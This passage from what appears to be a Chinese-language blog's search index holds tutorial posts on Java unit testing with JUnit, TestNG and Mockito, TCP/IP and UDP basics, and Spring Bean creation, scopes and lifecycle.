fa-external-link-alt\"></i></span></p>\n","categories":["Java基础"],"tags":["基础","异常"]},{"title":"Java基础-测试","url":"/2018/03/27/Java%E5%9F%BA%E7%A1%80-%E6%B5%8B%E8%AF%95/","content":"<p>在工作完成后，都需要对代码进行测试用例编写，如果采用TDD，那就更加离不开测试。</p>\n<span id=\"more\"></span>\n<h3 id=\"JUnit\"><a href=\"#JUnit\" class=\"headerlink\" title=\"JUnit\"></a>JUnit</h3><p>添加Maven依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.12<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>添加scope为test，表面该依赖只是在测试的时候使用。</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//业务类</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoService</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">demo</span><span class=\"params\">(List&lt;String&gt; str)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> str.add(<span class=\"string\">&quot;whh&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//测试类</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoServiceTest</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">demo</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        List&lt;String&gt; list = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\">        list.add(<span class=\"string\">&quot;whh&quot;</span>);</span><br><span class=\"line\">        list.add(<span class=\"string\">&quot;whhxz&quot;</span>);</span><br><span class=\"line\">        System.out.println(list);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>创建测试类，如上。<br>上述代码是通过IntelliJ IDEA生成测试类，为了规范，一般为需要测试的类后加上<code>Test</code>。通常会在测试代码中加上断言，IDEA在运行测试时，会自动加上<code>-ea</code>参数，断言失败时就会抛出异常。其他复杂方式可查看官方文档。</p>\n<p>Junit核心在于<code>org.junit.runner.JUnitCore</code>。可以通过打印方法调用栈堆来分析。</p>\n<h4 id=\"SpringJunit\"><a href=\"#SpringJunit\" class=\"headerlink\" title=\"SpringJunit\"></a>SpringJunit</h4><p>通常在项目中使用Spring框架，对代码进行测试时可以使用<code>spring-test</code>。<br>添加maven依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-test<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.3.13.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RunWith(SpringJUnit4ClassRunner.class)</span></span><br><span class=\"line\"><span class=\"meta\">@ContextConfiguration(locations = &quot;classpath*:applicationContext.xml&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeReplenishTaskServiceTest</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"meta\">@Qualifier(&quot;timeReplenishTaskService&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> AbstractReplenishTask replenishTask;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">create</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">      replenishTask.doSomethind();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如上使用SpringTest，通过<code>RunWith</code>配置<code>SpringJUnit4ClassRunner</code>，指定由<code>SpringJUnit4ClassRunner</code>启动，<code>ContextConfiguration</code>用来配置环境，其他的注入就如同普通的Spring注入。<br>Junit允许通过<code>RunWith</code>改变默认的执行类，不然默认就是<code>org.junit.runners.Suite</code>。</p>\n<h3 id=\"TestNG\"><a href=\"#TestNG\" class=\"headerlink\" title=\"TestNG\"></a>TestNG</h3><p>添加maven依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.testng<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>testng<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>6.8<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoServiceTest</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@org</span>.testng.annotations.Test</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">demo</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;demo&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@org</span>.testng.annotations.Test</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">login</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">1</span> / <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@org</span>.testng.annotations.Test(dependsOnMethods = &#123;<span class=\"string\">&quot;login&quot;</span>&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">userInfo</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;userInfo&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如上TestNG使用看起来和Junit一样，在TestNG中可以使用更多的功能，比如依赖。如上，userInfo就依赖于login测试，如果login失败，后续的userInfo就会直接跳过。<br>同时TestNG可以通过写xml文件来进行组合测试。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">suite</span> <span class=\"keyword\">SYSTEM</span> <span class=\"string\">&quot;http://testng.org/testng-1.0.dtd&quot;</span> &gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">suite</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;Suite&quot;</span> <span class=\"attr\">thread-count</span>=<span class=\"string\">&quot;5&quot;</span> <span class=\"attr\">verbose</span>=<span class=\"string\">&quot;1&quot;</span> <span class=\"attr\">parallel</span>=<span class=\"string\">&quot;false&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">test</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;demoService&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">classes</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">class</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;com.whh.netty.DemoServiceTest&quot;</span>/&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">classes</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">test</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">suite</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在xml中可以配置多个测试类进行整个流程的测试。</p>\n<h4 id=\"TestNG结合spring\"><a href=\"#TestNG结合spring\" class=\"headerlink\" title=\"TestNG结合spring\"></a>TestNG结合spring</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@org</span>.testng.annotations.Test</span><br><span class=\"line\"><span class=\"meta\">@ContextConfiguration(locations = &quot;classpath*:applicationContext.xml&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TimeReplenishTaskServiceTest</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractTestNGSpringContextTests</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Autowired</span></span><br><span class=\"line\">    <span class=\"meta\">@Qualifier(&quot;timeReplenishTaskService&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> AbstractReplenishTask replenishTask;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@org</span>.testng.annotations.Test</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">create</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">      replenishTask.doSomethind();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过继承AbstractTestNGSpringContextTests来实现和Spring结合使用。</p>\n<p>参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWJtLmNvbS9kZXZlbG9wZXJ3b3Jrcy9jbi9qYXZhL2otY3EwODI5Ni8=\">JUnit 4 与 TestNG 的对比<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"Mock框架\"><a href=\"#Mock框架\" class=\"headerlink\" title=\"Mock框架\"></a>Mock框架</h3><p>在开发过程中，可以依赖的某个功能未开发完成，就可以通过Mock框架来模拟对象替换部分功能来完成。</p>\n<h4 id=\"mockito\"><a href=\"#mockito\" class=\"headerlink\" title=\"mockito\"></a>mockito</h4><p>简单使用如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">DemoServiceTest</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Test</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">demo</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">List</span> <span class=\"variable\">list</span> <span class=\"operator\">=</span> Mockito.mock(List.class);</span><br><span class=\"line\">        <span class=\"comment\">//设置当使用list.get(0)时返回whh</span></span><br><span class=\"line\">        Mockito.<span class=\"keyword\">when</span>(list.get(<span class=\"number\">0</span>)).thenReturn(<span class=\"string\">&quot;whh&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//调用list.get(0)</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> (String) list.get(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">//验证是否调用</span></span><br><span class=\"line\">        Mockito.verify(list).get(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">//判断返回值</span></span><br><span class=\"line\">        Assert.assertEquals(<span class=\"string\">&quot;whh&quot;</span>, result);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用的Junit做的测试。创建mock对象不能对final，Anonymous，primitive类进行mock。<br>同时还可以设置方法返回异常等操作。<br>其他操作查看：<br><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21vY2tpdG8vbW9ja2l0by93aWtp\">mockito github<i class=\"fa fa-external-link-alt\"></i></span><br><span class=\"exturl\" data-url=\"aHR0cDovL3NpdGUubW9ja2l0by5vcmcv\">mockito官网<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>同样的mock框架还有<span class=\"exturl\" data-url=\"aHR0cDovL2ptb2NraXQuZ2l0aHViLmlvLw==\">jmockit<i class=\"fa fa-external-link-alt\"></i></span>、<span class=\"exturl\" data-url=\"aHR0cDovL2Vhc3ltb2NrLm9yZy8=\">easymock<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>未完待续。。。</p>\n","categories":["Java基础"],"tags":["基础","测试"]},{"title":"Java进阶-网络编程（一）","url":"/2018/03/28/Java%E8%BF%9B%E9%98%B6-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89/","content":"<p>在学习过程中，网络编程时永远绕不开的一个点。</p>\n<h3 id=\"OSI七层网络模型\"><a href=\"#OSI七层网络模型\" class=\"headerlink\" title=\"OSI七层网络模型\"></a>OSI七层网络模型</h3><p>开放式系统互联通信参考模型（英语：Open System Interconnection Reference Model，缩写为 OSI），简称为OSI模型（OSI model），一种概念模型，由国际标准化组织提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。定义于ISO&#x2F;IEC 7498-1。<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvT1NJJUU2JUE4JUExJUU1JTlFJThC\">OSI模型<i class=\"fa fa-external-link-alt\"></i></span></p>\n<p>网路模型图如下：<br><img src=\"/images/old/20180328%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72018-03-28%E4%B8%8B%E5%8D%884.02.56.png\"></p>\n<span id=\"more\"></span>\n<p>七层网络模型并不是一个必须遵循的标准，只是一个在制定标准时所使用的概念性框架。</p>\n<p>应用层：提供为应用软件而设的界面，以设置与另一应用软件之间的通信。如HTTP，HTTPS，FTP，TELNET，SSH等。<br>表示层：把数据转换为能与接收者的系统格式兼容并适合传输的格式。</p>\n<h3 id=\"TCP-IP协议族\"><a href=\"#TCP-IP协议族\" class=\"headerlink\" title=\"TCP&#x2F;IP协议族\"></a>TCP&#x2F;IP协议族</h3><p>互联网协议族（英语：Internet Protocol Suite，缩写IPS）是一个网络通信模型，以及一整个网络传输协议家族，为互联网的基础通信架构。它常被通称为TCP&#x2F;IP协议族（英语：TCP&#x2F;IP Protocol Suite，或TCP&#x2F;IP Protocols），简称TCP&#x2F;IP[2]。因为该协议家族的两个核心协议：TCP（传输控制协议）和IP（网际协议），为该家族中最早通过的标准。</p>\n<p>TCP&#x2F;IP提供点对点的链接机制，将数据封装、定址、传输、路由以及在目的地如何接收，都加以标准化。它将软件通信过程抽象化为四个抽象层，采取协议堆栈的方式，分别实现出不同通信协议。</p>\n<p>TCP&#x2F;IP协议分为4层：应用层、传输层、网络层、网络接口层。<br>应用层：上层应用可以直接使用的高级协议，如http、ftp，数据从程序中被编码成标准的协议格式，之后传递到下一层。<br>传输层：定义数据传输的协议，解决端到端可靠性和保证数据按照正确的顺序达到。<br>网络层：定义不同网络类型间通信协议（IP协议用于实现网络路由、ICMP检查网络通畅性、ARP获取设备MAC地址）<br>网络接口层：数据包从一个设备的网络层传输到另外一个设备的网络层的方法</p>\n<h4 id=\"TCP协议\"><a href=\"#TCP协议\" class=\"headerlink\" title=\"TCP协议\"></a>TCP协议</h4><p>TCP协议的运行可以划分为三个阶段：创建连接、数据传送、连接终止。</p>\n<p>TCP通过<code>三次握手</code>创建一个连接。过程如下：</p>\n<p>1、客户端向服务端发送<code>SYN</code>（是TCP&#x2F;IP建立连接时使用的握手信号）给服务端，客户端把这段连接的序号设定为随机数A，客户端进入<code>SYN_SEND</code>状态等待服务器确认。<br>2、服务端为一个合法的<code>SYN</code>回传<code>SYN/ACK</code>，<code>ACK</code>（确认字符）的确认码为A+1，<code>SYN/ACK</code>本身产生一个随机的序号B，服务端进入<code>SYN_RECV</code>状态。<br>3、客户端收到服务端消息后，再次发送一个<code>ACK</code>，当服务端收到该<code>ACK</code>时，完成了三次握手，进入创建拦截状态。此时包的序号被设定为收到的确认号A+1，而响应号则为B+1。客户端服务端都进入<code>ESTABLISHED</code>状态。</p>\n<p>如图：<br><img src=\"/images/old/20180328%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72018-03-28%E4%B8%8B%E5%8D%882.50.10.png\"></p>\n<ul>\n<li>如果服务端在发送<code>SYN/ACK</code>给客户端后，客户端掉线，那么服务端会重发<code>SYN/ACK</code>，Linux默认5次，每次间隔2的N次方秒，如果一直未收到客户端发送的ACK那么此次TCP连接超时。</li>\n</ul>\n<p>TCP断开链路通过<code>四次挥手</code>断开连接：</p>\n<p>1、主机1（服务端或者客户端）生成随机数向另一个主机2发送<code>FIN</code>报文，主机1进入<code>FIN_WAIT</code>状态，表示没有数据需要发送<br>2、主机2收到<code>FIN</code>报文，向主机1回复<code>ACK</code>报文，随机数+1，主机1进入<code>FIN_WAIT_2</code>状态，<br>3、主机2再次向主机1发送<code>FIN</code>报文，请求关闭连接，主机2进入<code>LAST_ACK</code>状态<br>4、主机1收到主机2<code>FIN</code>报文，向主机1发送<code>ACK</code>报文，然后主机1进入<code>TIME_WAIT</code>状态，主机2收到主机1的<code>ACK</code>报文后关闭连接，此时主机1等待2msl后未收到回复，正常关闭。</p>\n<p>主机1 –&gt; 主机2 ：主机1进入<code>FIN_WAIT</code>状态<br>主机2 –&gt; 主机1 ：主机1收到后进入<code>FIN_WAIT_2</code>状态<br>主机2 –&gt; 主机1 ：主机2进入<code>LAST_ACK</code>状态<br>主机1 –&gt; 主机2 ：主机1进入<code>TIME_WAIT</code>状态，2msl后未收到回复关闭，主机2收到报文后直接关闭</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvRmxvd19jb250cm9sXyhkYXRhKQ==\">流量控制<i class=\"fa fa-external-link-alt\"></i></span>：<br>流量控制用来避免主机分组发送得过快而使接收方来不及完全收下，一般由接收方通告给发送方进行调控。<br>TCP使用滑动窗口协议实现流量控制。接收方在“接收窗口”域指出还可接收的字节数量。发送方在没有新的确认包的情况下至多发送“接收窗口”允许的字节数量。接收方可修改“接收窗口”的值。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JThCJUE1JUU1JUExJTlFJUU2JThFJUE3JUU1JTg4JUI2\">拥塞控制<i class=\"fa fa-external-link-alt\"></i></span>：<br>拥塞控制是发送方根据网络的承载情况控制分组的发送量，以获取高性能又能避免拥塞崩溃（congestion collapse，网络性能下降几个数量级）。这在网络流之间产生近似最大最小公平分配。</p>\n<h4 id=\"UDP协议\"><a href=\"#UDP协议\" class=\"headerlink\" title=\"UDP协议\"></a>UDP协议</h4><p>用户数据报协议（英语：User Datagram Protocol，缩写为UDP），又称用户数据报文协议，是一个简单的面向数据报的传输层协议，正式规范为RFC 768。<br>在TCP&#x2F;IP模型中，UDP为网络层以上和应用层以下提供了一个简单的接口。UDP只提供数据的不可靠传递，它一旦把应用程序发给网络层的数据发送出去，就不保留数据备份（所以UDP有时候也被认为是不可靠的数据报协议）。UDP在IP数据报的头部仅仅加入了复用和数据校验（字段）。</p>\n<p>因为UDP消耗资源少，处理速度快，所以通常音频、视频等数据在传送时采用UDP较多，因为即使丢失少量的包，并不会产生较大的影响。<br>因为UDP在传输层无法保证数据的可靠性，需要在应用层来实现可靠性。</p>\n<p>要实现UDP的可靠性需要在应用层实现：确认机制、重传机制、窗口确认机制，在发送方面需要实现包的分片、包确认、包重发，在接收方面需要实现包的调序、包的序号确认</p>\n<p>开源的UDP实现可靠数据传输有：RUDP、RTP、UDT。<br>据说QQ部分消息传输采用的是UDP为主，TCP为辅。游戏王者荣耀也是。</p>\n<p>参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JUJEJTkxJUU3JUJCJTlDJUU0JUJDJUEwJUU4JUJFJTkzJUU1JThEJThGJUU4JUFFJUFF\">网络传输协议<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJDJUEwJUU4JUJFJTkzJUU2JThFJUE3JUU1JTg4JUI2JUU1JThEJThGJUU4JUFFJUFF\">传输控制协议<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2phd2lsL2Jsb2cvaXNzdWVzLzE0\">通俗大白话来理解TCP协议的三次握手和四次分手<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JTk0JUE4JUU2JTg4JUI3JUU2JTk1JUIwJUU2JThEJUFFJUU2JThBJUE1JUU1JThEJThGJUU4JUFFJUFF\">用户数据报协议<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n","categories":["Java进阶"],"tags":["进阶","网络编程","OSI","TCP","UDP"]},{"title":"Java进阶-Spring Bean","url":"/2018/03/28/Java%E8%BF%9B%E9%98%B6-Spring-Bean/","content":"<p>Spring作为JavaWeb流行框架，其核心之一就是Bean的管理。其中有Bean的创建、管理、加载。<br>添加SpringBean依赖，启动Spring。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-context<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.2.7.RELEASE<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>添加Spring配置文件application.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">beans</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xmlns:context</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">       <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">context:annotation-config</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<span id=\"more\"></span>\n<p>启动Spring容器</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">ApplicationContext</span> <span class=\"variable\">applicationContext</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ClassPathXmlApplicationContext</span>(<span class=\"string\">&quot;classpath:application.xml&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (String beanName : applicationContext.getBeanDefinitionNames()) &#123;</span><br><span class=\"line\">            System.out.println(beanName);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最简单的Spring容器启动就是这样。</p>\n<h3 id=\"SpringBean创建\"><a href=\"#SpringBean创建\" class=\"headerlink\" title=\"SpringBean创建\"></a>SpringBean创建</h3><p>进入ClassPathXmlApplicationContext分析Spring加载Bean的过程。<br>默认加载流程图如下（简化版）：<br><img src=\"/images/old/20180329Spring%E5%9F%BA%E6%9C%AC%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B.png\"></p>\n<p>基本就是先创建BeanFacotry（用于后续构建Bean）—&gt; 读取配置 —&gt; 封装需要创建的Bean<br>在这过程中有不少前置后置等相关处理。</p>\n<ul>\n<li>在处理不同的配置时，由不同的Handler处理，可以通过spring.handlers来查看。</li>\n</ul>\n<p>上述构造好需要组装的Bean后（Bean还未创建），之后通过BeanFactory创建需要的Bean。<br>默认加载流程图如下（单例简化版）：<br><img src=\"/images/old/20180329%E5%88%9B%E5%BB%BABean.png\"></p>\n<p>在之前创建的BeanFactory实际上创建的默认类为<code>DefaultListableBeanFactory</code><br>需要注意的是，在创建Bean的过程中，如果该Bean有其他依赖，先创建Bean后对其依赖的属性进行赋值，如果赋值的Bean不存在，会先创建该Bean，直到创建完成。</p>\n<ul>\n<li>如果是通过构造方法注入，两个Bean互相依赖，而且都是通过构造方法创建，那么就会出现死循环导致Spring启动异常。</li>\n</ul>\n<h3 id=\"Bean作用域\"><a href=\"#Bean作用域\" class=\"headerlink\" title=\"Bean作用域\"></a>Bean作用域</h3><p>Spring Bean创建有的对象有5类作用域：singleton、prototype、request、session、global session</p>\n<p>singleton：单例模式，就是在Spring容器中只存在一个改对象，生命周期随着Spring而走，当Spring容器关闭后随之销毁。<br>prototype：每次使用都会创建一个新的对象。<br>request：一般随着Web使用，一次request请求创建一次<br>session：随着Web使用，在一次seesion过程中创建一次<br>global session：全局session一次，一般用于Portlet，使用较少</p>\n<p>singleton、prototype创建可以查看代码<code>org.springframework.beans.factory.support.AbstractBeanFactory#doGetBean</code>，这里有判断创建的Bean的作用域，然后通过不同的作用域创建对象。</p>\n<p>对于request、session是通过不同的<code>org.springframework.beans.factory.config.Scope</code>所创建。</p>\n<ul>\n<li>如果需要一个singleton注入的是prototype属性，那么需要使用<code>@Scope proxyMode</code>，这样生成的bean就是有Spring生成的代理类，在调用时会生成不同的Bean，request、seesion同理，一有多。</li>\n</ul>\n<h3 id=\"Bean生命周期\"><a href=\"#Bean生命周期\" class=\"headerlink\" title=\"Bean生命周期\"></a>Bean生命周期</h3><p>1、创建实例<br>2、设置属性<br>3、调用初始化方法<br>4、放入容器，应用可以通过容器获取Bean<br>5、容器销毁，调用Bean销毁</p>\n<p>在使用过程中，创建的Bean实现不同的接口，创建时间不一样。</p>\n<ul>\n<li>在使用Spring时，使用xml配置时，默认是通过byName来确定对象，也就是配置的Bean 